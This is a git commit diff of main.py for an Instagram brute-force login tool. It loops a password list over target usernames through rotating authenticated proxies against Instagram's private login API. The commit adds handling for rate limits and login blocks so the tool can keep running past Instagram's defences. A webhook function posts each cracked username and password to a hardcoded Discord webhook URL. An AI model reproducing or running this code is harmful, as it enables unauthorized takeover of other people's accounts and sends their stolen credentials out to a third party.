9086df9438fc289615090f1f1c160619c78dea35
James <93611007+sjPsycho@users.noreply.github.com>
2022-09-18 00:03:18 -0400

    Update main.py

--- main.py
+++ main.py
@@ -11,33 +11,14 @@ os.system('title $React ~ Made for educational purposes only. (Fuck Society)')
 
 def clear():
     os.system('cls')
+
 clear()
-
-proxy_list = []
-with open('data/proxy.txt') as q:
-    proxy = q.readlines()
-
-o = 1
-for line in proxy:
-    prxy = line.split(':')
-    proxy1 = prxy[0]
-    port1 = prxy[1]
-    username1 = prxy[2]
-    password1 = prxy[3]
-    password1 = password1.strip('\n')
-
-    Proxys = 'http://' + username1 + ':' + password1 + '@' + proxy1 + ':' + port1
-    proxy_list.append(Proxys)
-    o += 1
 
 def webhook(userBruted, passKey):
     paramsGet = {"wait":"true"}
     rawBody = "{\"content\":null,\"embeds\":[{\"color\":16711680,\"fields\":[{\"name\":\"User Brute Forced\",\"value\":\"@" + userBruted + "\"},{\"name\":\"Password\",\"value\":\"" + passKey + "\"}],\"author\":{\"name\":\"Fuck Society\",\"url\":\"https://discord.dog/282008877753696268\",\"icon_url\":\"https://i.pinimg.com/originals/c6/d0/c1/c6d0c132b45434b4794cee4f2bbafa4a.png\"},\"footer\":{\"text\":\"sjPsycho\",\"icon_url\":\"https://cdn.discordapp.com/emojis/924055212321275934.webp?size=96&quality=lossless\"},\"timestamp\":\"2004-07-30T07:33:00.000Z\"}],\"username\":\"React\",\"avatar_url\":\"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHPVXVdrlc6-ueOw9Sd4EnbDyz0r1MFkdhnQ&usqp=CAU\",\"attachments\":[]}"
     headers = {"Origin":"https://discohook.org","Sec-Ch-Ua":"\"Chromium\";v=\"105\", \"Not)A;Brand\";v=\"8\"","Accept":"application/json","Sec-Ch-Ua-Platform":"\"Windows\"","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36","Referer":"https://discohook.org/","Sec-Fetch-Site":"cross-site","Sec-Fetch-Dest":"empty","Accept-Encoding":"gzip, deflate","Sec-Fetch-Mode":"cors","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","Content-Type":"application/json"}
     response = session.post("https://discord.com/api/v10/webhooks/1020878821584539699/gWa7KFsNri304FZVL8yO4aQ-mNWCXkL3I--PoPrSUIcqTUMFI99B5sEly3GdY55W2oBE", data=rawBody, params=paramsGet, headers=headers)
-
-with open ('data/users.txt') as p:
-    targets_list = p.read().split('\n')
 
 def post(targ, passLogin, Proxy):
     global attemptCounter, ifPasswCheckInt
@@ -62,7 +43,6 @@ def post(targ, passLogin, Proxy):
 
     try:
         response = session.post("https://i.instagram.com/api/v1/accounts/login/", data=paramsPost, headers=headers, proxies=proxies, timeout=5)
-        attemptCounter += 1
         lib = response.content.decode('utf-8')
 
         if("logged_in_user" in lib):
@@ -75,15 +55,43 @@ def post(targ, passLogin, Proxy):
             ifPasswCheckInt += 1
         elif("The password you entered is incorrect." in lib):
             print(f'[!] Bruting: {targ}')
-            print(f'[!] Password: {passLogin} == Incorrect!')
+            print(f'[$] Password: {passLogin} == Incorrect!')
+            ifPasswCheckInt += 1
+        elif("AccountHitRateLimit" in lib):
+            print("[" + Fore.LIGHTMAGENTA_EX + '%' + Fore.RESET + '] Account Hit Rate Limit, Trying Again.')
+            ifPasswCheckInt += 1
+        elif("rate_limit_error" in lib):
+            print("[" + Fore.LIGHTMAGENTA_EX + '%' + Fore.RESET + '] Account Hit Rate Limit, Trying Again.')
+            ifPasswCheckInt += 1
+        elif("RleLoginBlocked" in lib):
+            print('[' + Fore.LIGHTRED_EX + '&' + Fore.RESET + '] ReLoginBlocked.')
             ifPasswCheckInt += 1
         else:
             print(f'[Error] Log In @{targ} Failed || Response Code: {response.status_code}')
             print(f'[Reason] {response.content} || Password attempt: {passLogin}')
-            ifPasswCheckInt += 1
     except Exception as e:
         print(e)
         pass
+
+proxy_list = []
+with open('data/proxy.txt') as q:
+    proxy = q.readlines()
+
+o = 1
+for line in proxy:
+    prxy = line.split(':')
+    proxy1 = prxy[0]
+    port1 = prxy[1]
+    username1 = prxy[2]
+    password1 = prxy[3]
+    password1 = password1.strip('\n')
+
+    Proxys = 'http://' + username1 + ':' + password1 + '@' + proxy1 + ':' + port1
+    proxy_list.append(Proxys)
+    o += 1
+
+with open ('data/users.txt') as p:
+    targets_list = p.read().split('\n')
 
 with open('data/pass.txt') as f:
     passwords = f.read().split('\n')
@@ -104,6 +112,7 @@ ifPasswCheckInt = 0
 attemptCounter = 0
 a = 0
 r = 0
+print()
 for passW in passwords:
     for user in targets_list:
         try:
